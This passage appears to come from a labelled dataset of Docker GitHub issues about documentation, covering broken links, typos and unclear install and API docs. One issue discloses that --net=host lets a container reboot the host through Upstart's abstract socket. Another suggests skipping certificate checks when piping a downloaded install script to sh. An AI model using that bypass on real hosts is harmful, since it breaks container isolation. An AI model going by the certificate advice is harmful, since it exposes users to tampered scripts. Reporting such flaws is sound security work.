hostconfig.json\n-rw-r--r-- 1 root root   13 Sep 16 19:47 hostname\n-rw-r--r-- 1 root root  638 Sep 16 19:47 hosts\n-rw-r--r-- 1 root root  248 Sep 16 19:47 resolv.conf\n-rw------- 1 root root   71 Sep 16 19:47 resolv.conf.hash\n```\n\n```\nroot@[redacted]:/var/lib/docker/containers/4ca6a18d58bb6df9d77d30d64f17d208f3e02b3018888143f51522f2dcf8ddff# docker ps | grep 4ca6a18d58bb\n4ca6a18d58bb        my-app     \"npm start\"   4 days ago          Up 4 days           3001/tcp, 0.0.0.0:32779->3000/tcp            my_app_1\n```\n"},{"labels":["documentation",null],"text":"The docs (https://docs.docker.com/mac/step_six/) encourage users to enter their Docker Hub passwords in shell commands. This is bad because it exposes the password in clear text in the user's bash history. It would be better to have the user enter his or her password interactively.\n"},{"labels":["documentation",null],"text":"If you look at Docker run reference page at https://docs.docker.com/reference/run/ , the \"Runtime Constraints on CPU and Memory\" link in the Operator exclusive options is broken and \"goes nowhere\": https://docs.docker.com/reference/run/#runtime-constraints-on-cpu-and-memory\n"},{"labels":["documentation"],"text":"In docs/README.md:\nThe ### Generate the man pages section should refer to the README.md document in the man pages instead of referring in general to the man pages directory.\n\nIn man/README.mD:\nThe directory \"/docker\" is used to represent the user's '<'docker-fork'>' directory.. but the readme does not mention this.  Thus, the user may have problems following the instructions provided.\n\nI'll associate a PR with suggested changes.\n"},{"labels":["documentation"],"text":"We need better documentation about choosing a storage driver.  Jerome's presentation is a good place to start.\n"},{"labels":["documentation",null,null],"text":"i think, the follow example on file \n- docker/docs/reference/api/docker_remote_api_v1.21.md\n- docker/docs/reference/api/docker_remote_api_v1.20.md\n- docker/docs/reference/api/docker_remote_api_v1.19.md\n- ...\n\n```\nUlimits: { \"Name\": \"nofile\", \"Soft\": 1024, \"Hard\", 2048 }}\n```\n\nshould be\n\n```\nUlimits: { \"Name\": \"nofile\", \"Soft\": 1024, \"Hard\": 2048 }\n```\n"},{"labels":["documentation",null],"text":"As the Docker website continues to expand, it is going to become increasing difficult to find the information required by navigation alone. \n\neg. To find more information about a particular command, such as docker info, I used the following search string in Google: `docker info site:docs.docker.com`\n\nSee: https://www.python.org/\n"},{"labels":["documentation"],"text":"It seems the systemd service file doesn't load the config file from sysconfig which prevents any docker startup options from taking effect.\n\nDoc reference: https://docs.docker.com/articles/configuring/#configuring-docker-1\n"},{"labels":["documentation",null],"text":"As far as I know, we don't have documentation about how the volume, networking and other external driver proxies are generated. I don't think we have a make command to generate them. We should add documentation and a script to facilitate those tasks.\n"},{"labels":["documentation"],"text":"We don't yet have a style guide or instructions for creating man pages.\n"},{"labels":["documentation",null],"text":"If virtualization (VT-X) is not supported on the hardware that Docker Toolbox / VirtualBox is installed on, the VirtualBox VM will fail to start.\n\nWe should document that;\n- `VT-X` must be supported _and enabled_ on the hardware\n- How to check if `VT-X` is supported and enabled\n- Some basic instructions (or links to) to enable VT-X\n\nI opened an issue in the Docker Toolbox repository to track improvements in the installer; https://github.com/docker/toolbox/issues/166\n\nThis problem is reported in https://github.com/docker/docker/issues/11877, and mentioned in https://github.com/docker/docker/issues/15982#issuecomment-138822418, but there are various reports in the Docker Machine and Docker Toolbox repository as well.\n\n/cc @moxiegirl @jeffdm @ehazlett \n"},{"labels":["documentation",null,null],"text":"I noticed an incomplete sentence on the following link: https://docs.docker.com/articles/basics/. The \"Please\" is not followed by a proper sentence. Thought I'd bring it to your attention!\n\nIf you get docker: command not found or something like/var/lib/docker/repositories: permission denied you may have an incomplete Docker installation or insufficient privileges to access Docker on your machine. Please\n"},{"labels":["documentation",null],"text":"The new labels are now present, as decided on in https://github.com/docker/docker/pull/14719, and described in [project/ISSUE-TRIAGE.md](https://github.com/docker/docker/blob/master/project/ISSUE-TRIAGE.md), so the [\"find an issue\"](https://github.com/docker/docker/blob/master/docs/project/find-an-issue.md) page should be updated to reflect the new labels.\n"},{"labels":["documentation",null],"text":"This page has a typo: https://docs.docker.com/reference/commandline/cp/\n\nthe typo is : SRC_PAPTH => SRC_PATH\n"},{"labels":["documentation"],"text":"The API reference makes several references to the `AuthConfig` structure, but it's not described anywhere as far as I can tell.\n"},{"labels":["documentation",null,null],"text":"This:\n\n`docker run -v /path/to/nonexistent/directory:/container-path ...`\n\nResults in docker creating `/path/to/nonexistent/directory`.  I didn't expect this, and AFAICT, it's undocumented. \n\n`Linux mg-mesos 3.19.0-26-generic #28-Ubuntu SMP Tue Aug 11 14:16:32 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux`\n\n```\nClient:\n Version:      1.8.1\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   d12ea79\n Built:        Thu Aug 13 02:40:42 UTC 2015\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.8.1\n API version:  1.20\n Go version:   go1.4.2\n Git commit:   d12ea79\n Built:        Thu Aug 13 02:40:42 UTC 2015\n OS/Arch:      linux/amd64\n```\n\n```\nContainers: 30\nImages: 112\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 172\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 3.19.0-26-generic\nOperating System: Ubuntu 15.04\nCPUs: 4\nTotal Memory: 11.62 GiB\nName: mg-mesos\nID: 7AES:SDZ5:WNYM:NM33:3FKF:SQK6:KYMM:DBXJ:DLGK:MN6L:WYRR:EFTI\nUsername: mgummelt\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\n```\n"},{"labels":[null,"documentation"],"text":"It would be useful to have a list of error codes and their corresponding cause. This could be in a tabular format such as:\n\n| Error Code | Meaning |\n| --- | --- |\n| NNN | Text |\n| NNN | Text |\n"},{"labels":["documentation",null],"text":"We currently have https://get.docker.com to get users up and running in \"no\" time, so that they can play around with Docker. Let's call it \"express install\".\n\nFor Linux, this is https://get.docker.com, for Windows and Mac users, we have Docker Toolbox, which (to me) fall in the same category; get users started quickly.\n\nHowever, the \"express install\" is in many cases _not_ suitable for production; we make many assumptions, and some settings we use are just to \"get it working\", but require manual configuration to be really useful (for example, the default device mapper configuration is not suitable for production).\n\nWe should point users to an \"advanced install\" section in the documentation, and _warn_ users that the \"express install\" should be reviewed before using in production.\n\nThe advanced install section in the documentation, should cover (or link to) - this is not a full list, just some initial thoughts;\n- Checking prerequisites (e.g., using `/contrib/check-config.sh`)\n- Pinning to a specific version of Docker\n- Picking, setting up, and configuring a graph driver (e.g. Setting up aufs)\n- Configuring daemon options (SysVinit, SystemD)\n- Picking, and configuring a default logging-driver\n- Securing Docker (Certificates, AppArmor, SeLinux)\n- Networking options and related (e.g. Certificates, Userland Proxy, FireWall issues)\n\nTL;DR; we should make it as easy as possible for people to get to \"play\" with Docker, but equally (if not more) important, we should explain that Docker uses advanced techniques; making optimum use of Docker _does_ require careful planning and configuration, and making informed decisions (e.g. The best graph driver for your situation). \n"},{"labels":["documentation"],"text":"In https://docs.docker.com/project/set-up-dev-env/ (Start a container and run a test, part 8)\n\nThe command line example has been updated to use `daemon` rather than `-d`:\n\n> `root@5f8630b873fe:/go/src/github.com/docker/docker#  docker daemon -D`\n\nBut the following explanation still refers to `-dD`, which was previously there\n\n> The -dD flag starts the daemon in debug mode. You’ll find this useful when debugging your code.\n"},{"labels":["documentation",null,null],"text":"The options for the `-v` flag on `docker run` seem to be lacking.\nSpecifically they only mention `rw` and `ro` as valid flags mean while there are also `z` and `Z`, which can be used independently or concatenated as such: `rw,Z`\n"},{"labels":["documentation"],"text":"I believe https://github.com/docker/docker/pull/14242 introduced a regression where if you run a container with an external volume, and then kill the docker daemon, any following usage of the volume results in system errors.\n\nIt looks like the volume name is recognized, but it does not try and mount the volume.\n\n```\n./docker -d --storage-driver=vfs &\n./docker run -ti --volume-driver=rexray -v testa15:/test busybox\nkill pid\n```\n\n```\n./docker -d --storage-driver=vfs &\n./docker run -ti --volume-driver=rexray -v testa15:/test busybox\nINFO[0003] POST /v1.21/containers/create                \nINFO[0003] POST /v1.21/containers/deb4b572c3fa950d16279d0e5485c7322e2b865f5f0d666a94a561f4140dfb4c/attach?stderr=1&stdin=1&stdout=1&stream=1 \nINFO[0003] POST /v1.21/containers/deb4b572c3fa950d16279d0e5485c7322e2b865f5f0d666a94a561f4140dfb4c/start \nTimestamp: 2015-08-27 07:18:29.736025403 +0000 UTC\nCode: System error\n\nMessage: stat /var/lib/docker/volumes/testa15/_data: no such file or directory\n\nFrames:\n\n---\n0: setupRootfs\nPackage: github.com/opencontainers/runc/libcontainer\nFile: rootfs_linux.go@37\n\n```\n\n```\n[root@mdm2 centos]# ./docker version\nINFO[0457] GET /v1.21/version                           \nClient:\n Version:      1.9.0-dev\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   44ea7e9\n Built:        Thu Aug 27 07:14:12 UTC 2015\n OS/Arch:      linux/amd64\n```\n"},{"labels":["documentation",null,null],"text":"The build and run commands both have long sections of examples.  In run them come in the middle of the page in build they come at the end.\n- Standardize examples at the end of every page\n- Design a consistent structure for calling out \"categories of examples\" in these larger sections\n\nhttp://docs.docker.com/reference/commandline/build/\nhttp://docs.docker.com/reference/commandline/run/\n"},{"labels":["documentation",null],"text":"Hi,\n\nI have a graph driver related question.\n\nSuppose one wants to design and implement a graph driver for some new file system, what would be the general rule to do so? I mean, one can look into existing graph drivers (e.g., btrfs, aufs, zfs, vfs, devmapper, etc) to figure out interfaces and data structures for the new file system driver, but is there any driver specification doc available somewhere? It will make it easier to design new file system driver for docker.\n\nAny suggestions/comments would be helpful! Thanks.\n\nBest,\n"},{"labels":["documentation"],"text":"The Docker engine install steps on Ubuntu include a step to install linux-image-(uname -r), followed by a step to reboot the system.  (see: https://github.com/docker/docker/blob/master/docs/installation/ubuntulinux.md)\n\nHowever, the Docker install script (https://github.com/docker/docker/blob/master/hack/install.sh) automatically performs this step.\n\nCan we remove the instructions to manually install linux-image-\\* and to reboot?\n"},{"labels":["documentation"],"text":"The [Content trust in Docker](https://docs.docker.com/security/trust/content_trust/) docs state (my emphasis on creating):\n\n> Make sure you read [Manage keys for content trust](https://docs.docker.com/security/trust/trust_key_mng) information for details on **creating**, securing, and backing up your keys.\n\nBut there's nothing about creating keys on the [Manage keys for content trust](https://docs.docker.com/security/trust/trust_key_mng) page because they're actually created on the first push as per:\n\n> When you push your first tagged image with content trust enabled, the docker client recognizes this is your first push and:\n> - alerts you that it will create a new offline key\n> - requests a passphrase for the key\n> - generates an offline key in the ~/.docker/trust directory\n> - generates a tagging key for in the ~/.docker/trust directory\n\nIt would be beneficial if the key creation process was explained outside of the **Push trusted content** section.\n\nDocumentation issue - so not copying in version/info etc.\n"},{"labels":["documentation",null],"text":"There's a lot of work to do here :)\n"},{"labels":["documentation"],"text":"- Current installation docs for Toolbox don't show how to upgrade a vm\n- Should show after version information how to upgrade VM as opposed to install/upgrade Toolbox\n"},{"labels":["documentation"],"text":"Or at least give a kind doc. \nSolution in #9697 seems not quite working now.\nFeel free to close it if there is a dup. Yet i didn't find one.\n"},{"labels":["documentation"],"text":"Hi,\n\nThere is a mistake in documentation for windows installation, in the part to connect with putty (Login with PUTTY instead of using the CMD).\n\nWith DockerToolbox, RSA keys was not generated in **%USERPROFILE%.ssh\\id_boot2docker** but in **%USERPROFILE%.docker\\machine\\machines<nameOfYourMachin\\**\n\nThe file to be modify :\ndocker/docs/installation/windows.md\n\nThanks :)\n"},{"labels":["documentation",null],"text":"Found a dead link in logging run reference: docs.docker.com/reference/run/…\n"},{"labels":["documentation",null],"text":"- Replace any links to the files in /terms with links to reference/glossary.md\n- Remove the /terms directory\n"},{"labels":["documentation",null],"text":"Earlier a missing page(404) redirected to the homepage, now it shows the following error : \n\n![image](https://cloud.githubusercontent.com/assets/796949/9212494/2ae7cc8e-403e-11e5-811d-6c4a4d7846e5.png)\n"},{"labels":["documentation"],"text":"The CentOS installation instructions at https://docs.docker.com/docker/installation/centos/ (`docs/installation/centos.md`) suggest that after installing the package one should:\n\n```\n4. Start the Docker daemon.\n\n                $ sudo service docker start\n```\n\n`service` is a thin layer on top of systemctl on CentOS.  And starting a systemctl service is only half the job.  After a reboot, the service will be stopped again.  To make it run on every boot, it needs to be \"enabled\" as well:\n\n```\n    sudo systemctl enable docker\n    sudo systemctl start docker\n```\n"},{"labels":["documentation"],"text":"It's not clear from any documentation that I can find whether `docker run --rm` is equivalent to doing a `docker rm -v` on the created container. Caveat: I usually can't find the mustard in the fridge because I'm looking everywhere _except_ right in front of me.\n"},{"labels":["documentation",null,null],"text":"Someone came to me trying to understand how `--publish` worked, confused that `--publish 1234` wasn't publishing `1234` on the host. They had come from the builder `EXPOSE` documentation and had left confused.\r\n\r\n[This link is broken in the builder documentation is broken](https://github.com/docker/docker/blame/f3af9c8bdb68e5db7aaed7aec11aa2a78fd7e546/docs/reference/builder.md#L457).\r\n\r\nOr at least, it doesn't go where I think was intended. In addition, [the `docker run`](https://docs.docker.com/engine/reference/run/#expose-incoming-ports) documentation doesn't mention the long form of `-p` (`--publish`) at all. \r\n\r\nIf someone is new to docker trying to understand how port publishing works, the `EXPOSE` section in the `docker run` documentation is not as up front as it could be about how to control the host port. (likewise with the `EXPOSE` in the builder docs).\r\n\r\nI would have submitted a fix to just point the link to `/reference/run/#expose-incoming-ports` but then I realised that it wouldn't really fix the problem of explaining what `-p` is, and that this would mean repeating the same link many times, which I don't think would have made for very good documentation.\r\n\r\nSo I thought I would punt the problem to the documentation experts here - sorry! :)\r\n\r\n/cc @SvenDowideit\r\n"},{"labels":["documentation"],"text":"In particular, the CLI lacks a full description and syntax.\n"},{"labels":["documentation"],"text":"https://docs.docker.com/reference/api/docker_remote_api/\n\nThere is a state diagram under \"Docker Events\" and it looks okay on a large screen. However, on smaller screens (such as laptops), due to the page flow, the diagram can become too small to read.\n\nWould be nice from a UX perspective if there was a way to zoom-in / maximize the picture when clicked. :relaxed:\n"},{"labels":["documentation"],"text":"Docker labels are included in the json output for /containers/json (probably since docker 1.6), but there is no mention of this in the API. Please add/describe these expected fields.\n\nLink for reference: https://docs.docker.com/reference/api/docker_remote_api_v1.19/#list-containers\n"},{"labels":["documentation"],"text":"For openSUSE Tumbleweed there is a wrong path to 'Routing' menu in docker installation docs.  \nHere is the link: https://docs.docker.com/installation/SUSE/\n\n> \"If you want your containers to be able to access the external network you must enable the net.ipv4.ip_forward rule. This can be done using YaST by browsing to the Network Devices -> Network Settings -> Routing menu and ensuring that the Enable IPv4 Forwarding box is checked.\" \n\nIt's true for openSUSE 12.3, 13.1, 13.2 and also for SLES12, but for openSUSE Tumbleweed there is no 'Network devices' menu in YaST and 'Network settings' menu in 'System' menu of YaST. \nSo I believe that we need to add that information into docs. \n"},{"labels":["documentation"],"text":"Now we can do `docker rm $(docker ps -aq)` and ignore the errors if a container is running.\n\nBut it doesn't seem like a good solution.\n\nCould `docker rm --stopped` be a solution?\n\nAfter a lot of builds via Dockerfiles, many stopped, only used once containers are left in the system and takes up much space.\n\nThanks for looking into this.\n"},{"labels":["documentation"],"text":"Hi, would it be possible to display a page-title in the docs? When browsing the documentation with multiple tabs it is hard to distinguish which tab has which section open:\n\n![screen shot 2015-07-30 at 10 03 16](https://cloud.githubusercontent.com/assets/23406/8978403/3e8e8b74-36a2-11e5-8bb4-aca98146513e.png)\n"},{"labels":["documentation",null],"text":"The docs for 'docker run' should explain the `security-opts` flag.\n"},{"labels":["documentation",null],"text":"Hello,\n\nI have an hard time figuring out how to get the real remote ip of a client connecting to a (web) service inside a container which port is exposed to a port on the host.\n\nSo far the solution seems to be either one of:\n- use `--net=host`\n- disable the userland proxy\n- configure nginx on the host to forward the real ip address?\n\nHere are related issues:\n\nhttps://github.com/docker/docker/issues/7540\nhttps://github.com/jwilder/nginx-proxy/issues/130\nhttps://github.com/jwilder/nginx-proxy/issues/133\n\nNone of the current solutions seems to be \"right\" and they all seem temporary. Can you clarify/explain how things _should_ be, even if that means that the current docker 1.7.1 is bugged in that regard and that we have to use hack X or Y until things are fixed in 1.8.0.\n"},{"labels":["documentation",null],"text":"[Docs for API v1.19](https://docs.docker.com/reference/api/docker_remote_api_v1.19/#create-an-image) states that it is possible to specify `registry` query parameter:\n\n```\nQuery Parameters:\n    ...\n    registry – The registry to pull from.\n    ...\n```\n\nI'm trying to do so, but it's ignores registry parameter:\n\n```\n$ curl -v -XPOST --unix-socket /var/run/docker.sock \"http:/images/create?fromImage=bronislav/clsi-sharelatex:latest&registry=quay.io\"\n*   Trying /var/run/docker.sock...\n* Connected to http (/var/run/docker.sock) port 80 (#0)\n> POST /images/create?fromImage=bronislav/clsi-sharelatex:latest&registry=quay.io HTTP/1.1\n> Host: http\n> User-Agent: curl/7.42.1\n> Accept: */*\n>\n< HTTP/1.1 200 OK\n< Content-Type: application/json\n< Date: Tue, 28 Jul 2015 14:22:51 GMT\n< Transfer-Encoding: chunked\n<\n{\"status\":\"Pulling repository bronislav/clsi-sharelatex\"}\n{\"errorDetail\":{\"message\":\"Error: image bronislav/clsi-sharelatex:latest not found\"},\"error\":\"Error: image bronislav/clsi-sharelatex:latest not found\"}\n* Connection #0 to host http left intact\n```\n\nIf I move registry parameter to the image path than docker started to pull image:\n\n```\ncurl -v -XPOST --unix-socket /var/run/docker.sock \"http:/images/create?fromImage=quay.io/bronislav/clsi-sharelatex:latest\"\n*   Trying /var/run/docker.sock...\n* Connected to http (/var/run/docker.sock) port 80 (#0)\n> POST /images/create?fromImage=quay.io/bronislav/clsi-sharelatex:latest HTTP/1.1\n> Host: http\n> User-Agent: curl/7.42.1\n> Accept: */*\n>\n< HTTP/1.1 200 OK\n< Content-Type: application/json\n< Date: Tue, 28 Jul 2015 14:48:16 GMT\n< Transfer-Encoding: chunked\n<\n{\"status\":\"Pulling repository quay.io/bronislav/clsi-sharelatex\"}\n...\n{\"status\":\"Status: Image is up to date for quay.io/bronislav/clsi-sharelatex:latest\"}\n* Connection #0 to host http left intact\n```\n\nMy environment:\n\n```\n$ docker version\nClient version: 1.7.1\nClient API version: 1.19\nGo version (client): go1.4.2\nGit commit (client): 786b29d-dirty\nOS/Arch (client): linux/amd64\nServer version: 1.7.1\nServer API version: 1.19\nGo version (server): go1.4.2\nGit commit (server): 786b29d-dirty\nOS/Arch (server): linux/amd64\n```\n\n```\n$ docker info\nContainers: 2\nImages: 27\nStorage Driver: overlay\n Backing Filesystem: extfs\nExecution Driver: native-0.2\nLogging Driver: journald\nKernel Version: 4.0.9-coreos\nOperating System: CoreOS 752.1.0\nCPUs: 2\nTotal Memory: 7.341 GiB\nName: ip-10-5-3-181.empire\nID: 7APU:UBUI:7WEM:X5DL:BY7B:MQM6:4IAX:VZUN:2GZ4:LV7I:7PWI:42UC\n```\n\n```\n$ uname -a\nLinux ip-10-5-3-181.empire 4.0.9-coreos #2 SMP Thu Jul 23 20:22:11 UTC 2015 x86_64 Intel(R) Xeon(R) CPU E5-2670 v2 @ 2.50GHz GenuineIntel GNU/Linux\n```\n\nFurther investigation shows that this parameter simply ignored in the request handler. It's only takes in account `fromImage`, `repo` and `tag` parameters: [api/server/server.go#L729-L733](https://github.com/docker/docker/blob/master/api/server/server.go#L729-L733).\n"},{"labels":["documentation",null],"text":"In the Installation step 3.\n\n![image](https://cloud.githubusercontent.com/assets/1347209/8911222/e878495a-343f-11e5-8bbd-4109eb00cb37.png)\n"},{"labels":["documentation"],"text":"Under \"Creating a Dockerfile\", the last line is missing an indent\nhttps://docs.docker.com/docker-trusted-registry/quick-start/#creating-a-dockerfile\n\n```\n FROM jenkins\n\n #New plugins must be placed in the plugins file\n COPY plugins /usr/share/jenkins/plugins\n\n #The plugins.sh script will install new plugins\n RUN /usr/local/bin/plugins.sh /usr/share/jenkins/plugins\n\n #Copy private key and cert to image\n COPY https.pem /var/lib/jenkins/cert\n COPY https.key /var/lib/jenkins/pk\n\n #Configure HTTP off and HTTPS on, using port 1973\nENV JENKINS_OPTS --httpPort=-1 --httpsPort=1973 --httpsCertificate=/var/lib/jenkins/cert --httpsPrivateKey=/var/lib/jenkins/pk\n```\n\nIf someone can point out where the file is, I can fix.\n"},{"labels":["documentation",null],"text":"The FAQ on docs.docker.com has broken links. Need to fix them.\n"},{"labels":["documentation"],"text":"In your tutorial documentation on https://docs.docker.com/mac/step_four/ you have in steap 1.5:\n\nCMD /usr/games/fortunes -a | cowsay\n\nand then on step 2.2:\n\nCMD /usr/games/fortune -a | cowsay # Singular fortune\n\nThe 2nd example is correct.\n"},{"labels":["documentation"],"text":"Description of problem: The `docker run --user` documentation states:\n\n> The default user within a container is root (id = 0), but if the developer created additional users, \n> those are accessible too. \n\nThis is misleading, as it is possible to just pass an arbitrary uid:gid to `-u` and run using that. As stackoverflow is also full of suggestions to use `groupadd && useradd && sudo -u` tricks to achieve the same effect, it seems like many people fall for this.\n\n`docker version`: N/A, but https://docs.docker.com/reference/run/#user as of 2015-07-21 11:22 UTC shows this issue.\n\n`docker info`: N/A\n\n`uname -a`: N/A\n\nEnvironment details (AWS, VirtualBox, physical, etc.): Docker website\n\nHow reproducible: 100%\n\nSteps to Reproduce:\n1. Point browser at https://docs.docker.com/reference/run/#user\n2. Read misleading documentation\n3. Compare with what happens on `docker run debian:jessie /usr/bin/id 1000; docker run -u 1000 debian:jessie /usr/bin/id`\n\nActual Results:\n\n```\n/usr/bin/id: 1000: no such user\nuid=1000 gid=0(root) groups=0(root)\n```\n\nExpected Results:\n\n```\n/usr/bin/id: 1000: no such user\n# something blows up because no user with uid 1000 exists\n```\n\nAdditional info:\nThe actual behaviour is much more useful than what the documentation describes. The documentation should be updated accordingly.\n"},{"labels":["documentation",null,null],"text":"Upstart, Ubuntu's init replacement, listens on an \"abstract socket pathname\" AF_UNIX socket for commands.\n\n```\ndbus/upstart.h\n79:#  define DBUS_ADDRESS_UPSTART \"unix:abstract=/com/ubuntu/upstart\"\n```\n\nNormally, you'd expect AF_UNIX class sockets to be governed by filesystem isolation, same as a `chroot`.  However the \"abstract\" names seem to escape this restriction and instead use the networking restriction.  [This is documented as a way to bypass chroot security, for example](http://blog.eduardofleury.com/archives/2007/09/13)  This means that disabling network isolation gives a container effectively full control of your host, no matter what other restrictions you may place on it:\n\n```\nroot@mesos-slave9-qa-uswest2:~# docker run --net=host ubuntu reboot\nubuntu:latest: The image you are pulling has been verified. Important: image verification is a tech preview feature and should not be relied on to provide security.\nStatus: Downloaded newer image for ubuntu:latest\nFATA[0009] Error response from daemon: engine is shutdown\nroot@mesos-slave9-qa-uswest2:~# Connection to mesos-slave9-qa-uswest2.qasql.opentable.com closed by remote host.\nConnection to mesos-slave9-qa-uswest2.qasql.opentable.com closed.\n```\n\nWhile this may be \"working as designed\" from a kernel isolation standpoint, this is an extremely unintuitive behavior for end users and quite possibly a huge security problem.  In particular that within the class AF_UNIX there are some sockets which are governed by network isolation (those beginning with a magical '\\0') and some by filesystem isolation (the rest).  Some combination of the following may help:\n- [Upstart should not use confusing abstract sockets, but prefer filesystem sockets](https://bugs.launchpad.net/upstart/+bug/1476353)\n- Docker should control isolation of AF_UNIX class sockets separately from AF_INET and others (i.e. I want to share my host's network stack without allowing side channels to init)\n- A specific security rule blocking access to the `com/ubuntu/upstart` socket in particular.  Somewhat ugly, but maybe practical.\n\n```\nroot@mesos-slave6-qa-uswest2:~# docker version\nClient version: 1.6.2\nClient API version: 1.18\nGo version (client): go1.4.2\nGit commit (client): 7c8fca2\nOS/Arch (client): linux/amd64\nServer version: 1.6.2\nServer API version: 1.18\nGo version (server): go1.4.2\nGit commit (server): 7c8fca2\nOS/Arch (server): linux/amd64\nContainers: 8\nImages: 62\nStorage Driver: overlay\n Backing Filesystem: extfs\nExecution Driver: native-0.2\nKernel Version: 4.0.4\nOperating System: Ubuntu 14.04.2 LTS\nCPUs: 8\nTotal Memory: 29.45 GiB\nName: mesos-slave6-qa-uswest2\nID: DQ77:L5SM:2ZH6:NHRP:D72D:SIFN:XJDS:7H7Y:MHRR:UX4Y:HTWK:UVB6\n```\n"},{"labels":["documentation"],"text":"Found a few problems with this section:\nhttps://docs.docker.com/reference/builder/#environment-replacement\n\n> Note: prior to 1.3, Dockerfile environment variables were handled similarly, in that they would be replaced as described below. However, there was no formal definition on as to which instructions handled environment replacement at the time. After 1.3 this behavior will be preserved and canonical.\n> \n> ... there was no formal definition on as to which instructions handled environment replacement at the time\n> 1. This sentence doesn't make sense.\n\nDockerfile environment variables were handled similarly\n2. Similarly to what? Perhaps the note block should be moved after the explanation of Environment variable.\n\nPerhaps someone could review the Environment variable section and reorganize the material presented.\n"},{"labels":["documentation"],"text":"https://docs.docker.com/installation/ubuntulinux/\n\nUnder Installation, step 3, there are odd > characters in the paragraph:\n![screen shot 2015-07-18 at 6 39 52 am](https://cloud.githubusercontent.com/assets/679475/8761787/fae2db20-2d17-11e5-91b6-f9781c99b372.png)\n\nI think the > is used as quote in GitHub's markdown and does not render properly on the docs site.\nhttps://github.com/docker/docker/blob/master/docs/installation/ubuntulinux.md\n"},{"labels":["documentation"],"text":"The basic docs for swarm use `docker run swarm`, keeping it clear that the binary is in a container. The \"discovery\" section refers to `swarm` as a binary. The [swarm docs on GitHub](https://github.com/docker/swarm) show how to build the `swarm` binary, but this is not mentioned in docs.docker.com\n\nPlease pick one method and use that for all documentation or otherwise make it clear how to execute the commands.\n"},{"labels":["documentation"],"text":"Need to point to the reference/logging page from the logs.md page as per comments on this PR: https://github.com/docker/docker/pull/11485/files#diff-bf81424845bcab2902c9809e30dfe6e0\n\nAlso should update the page to point that other drivers have other options\n"},{"labels":[null,"documentation",null],"text":"As discussed in https://github.com/docker/docker/pull/13375#issuecomment-120170880, the [Docker Hub and Registry V1](https://github.com/docker/docker/blob/master/docs/reference/api/hub_registry_spec.md) API reference needs to be deprecated or rewritten.\n\nAdding this issue as a reminder, but there might be an overlap here with the distribution docs, so not sure what the best approach is here.\n\nAlso, technical guidance is needed here (https://github.com/docker/docker/pull/13375#issuecomment-120173326)\n\n/cc @moxiegirl @tiborvass @stevvooe \n"},{"labels":["documentation"],"text":"The recommanded installation procedure on Linux with `wget` is failing:\n\n```\nwget -qO- https://get.docker.com/ | sh\n```\n\nreturns no error (exit 0) but nothing happen either.\n\nTrying a simple `wget https://get.docker.com` reveals an SSL certificate verification issue:\n\n```\n--2015-07-15 10:44:50--  https://get.docker.com/\nResolving get.docker.com (get.docker.com)... 52.0.250.56, 52.6.66.251, 54.210.203.88\nConnecting to get.docker.com (get.docker.com)|52.0.250.56|:443... connected.\nERROR: cannot verify get.docker.com's certificate, issued by `/C=US/O=GeoTrust Inc./CN=RapidSSL SHA256 CA - G3':\n  Unable to locally verify the issuer's authority.\nTo connect to get.docker.com insecurely, use `--no-check-certificate'.\n```\n\nSo, unfortunately, passing the `--no-check-certificate` option to grab the script is the only way to go at the moment.\n"},{"labels":["documentation",null],"text":"User reports:\n\nhttps://docs.docker.com/articles/dockerfile_best-practices/#run-only-one-process-per-container implies that process=application=service which IMO may not be always true, WDYT?\n\n\"In almost all cases, you should only run a single process in a single container. Decoupling applications into multiple containers makes it much easier to scale horizontally and reuse containers. If that service depends on another service, make use of container linking.\"\n"},{"labels":["documentation",null],"text":"I thought they were already removed, we have talked about this in the past (can't remember who it was), and I thought we agreed we would remove the API docs, or at least mark as deprecated, so it wouldn't cause confusion.\n"},{"labels":["documentation"],"text":"https://docs.docker.com/articles/dockerfile_best-practices/\n\nI read the following suggestion a number of times and I don't quite understand what it means?\n\n> Don’t do RUN apt-get update on a single line. This will cause caching issues if the referenced archive gets updated, which will make your subsequent apt-get install fail without comment.\n1. Is it referring to Docker cache or apt cache?\n2. What referenced archive is it referring to?\n\nIt would be nice if this first bullet can be improved. For example, the information the 2nd bullet is clear.\n\nAlso, it is important to clarify the documentation because other people may be using yum package manager and needs to understand the mechanics of the RUN command to follow the best practices.\n"},{"labels":["documentation"],"text":"This issue transfer of https://github.com/docker/docs-base/issues/102\n\nFor me, it seems this link:\n\nhttp://docs.docker.com/installation/mac/\n\ndoesn't fully work.  When using nginx, the SSL ports are not working (can't curl, telnet, etc.)\n\nAlso, some of the commands like under section \"Mount a volume on the container\" step 5 don't show any wrapping, so unless you know to look, you miss part of the command.  Aka, I only see:\n\ndocker run -d -P -v $HOME/site:/usr/share/nginx/html --name\n\nWhen you should see\n\ndocker run -d -P -v $HOME/site:/usr/share/nginx/html --name mysite nginx\n\nClearly that could be a css browser issue, but in my latest Chrome, there is no eye candy to show the command goes long.\n\nRegards.\n\nRon \n"},{"labels":["documentation"],"text":"Version, Os, and KernelVersion are being returned even for `/v1.17/version` calls.\n\nRef: https://bugzilla.redhat.com/show_bug.cgi?id=1241699\n"},{"labels":["documentation",null],"text":"Hi,\n\nI spun up two Ubuntu 14.04 VMs in AWS, and on each, upgraded to the 3.18 kernel, installed docker, did a git clone https://github.com/docker/docker.git; followed by a make DOCKER_EXPERIMENTAL=1 . I then created a soft link to docker/bundles/1.8.0-dev/binary/docker-1.8.0-dev at /usr/bin/docker, effectively replacing the older docker that was installed.\n\nThen, I followed the instructions at https://github.com/docker/libnetwork/blob/master/docs/overlay.md, copy-pasting each instruction and replacing the IPs as applicable. Consul came up, docker daemons came up well on each node, and I was able to create services, networks, attach containers to services, etc, as described in the document.\n\nThe problem I'm seeing is that while pings between containers on the same host work fine, I'm not able to ping one container from another across the two hosts. \n\nAny idea why this doesn't work? I'll be testing libnetwork on my vagrant setup in a short while, and will update the bug with those results.\n\nThanks,\nRegards,\nVijay\n"},{"labels":["documentation"],"text":"Hello,\n\nOn this page: http://docs.docker.com/installation/mac/\n\nUnder this heading: \"From your command line\"\n\nStep 3: Display the environment variables for the Docker client.\n\nIt says to run 'boot2docker shellinit' to display your environment variables for the Docker client. It does not.\n\n> boot2docker shellinit \n> Writing 